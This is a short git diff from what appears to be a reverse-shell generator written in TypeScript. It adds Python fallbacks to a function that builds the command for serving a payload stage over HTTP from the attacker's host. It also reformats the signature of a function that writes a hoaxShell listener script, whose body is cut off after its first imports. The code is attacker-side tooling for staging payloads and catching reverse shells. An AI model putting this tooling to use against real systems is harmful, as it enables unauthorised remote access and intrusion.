@@ -30,7 +30,8 @@ export function stageFileName(config: ReverseShellConfig): string {
 }
 
 export function stageServeCommand(config: ReverseShellConfig): string {
-  return `python3 -m http.server ${config.httpPort ?? config.lport} --bind ${config.lhost}`;
+  const port = config.httpPort ?? config.lport;
+  return `python3 -m http.server ${port} --bind ${config.lhost} || python -m http.server ${port} --bind ${config.lhost} || python2 -m SimpleHTTPServer ${port}`;
 }
 
 export function hoaxShellServerFileName(): string {
@@ -41,7 +42,9 @@ export function hoaxShellServerCommand(config: ReverseShellConfig): string {
   return `python3 ${hoaxShellServerFileName()} --host ${config.lhost} --port ${config.lport}`;
 }
 
-export function createHoaxShellServerScript(config: ReverseShellConfig): string {
+export function createHoaxShellServerScript(
+  config: ReverseShellConfig,
+): string {
   return `#!/usr/bin/env python3
 import argparse
 import queue
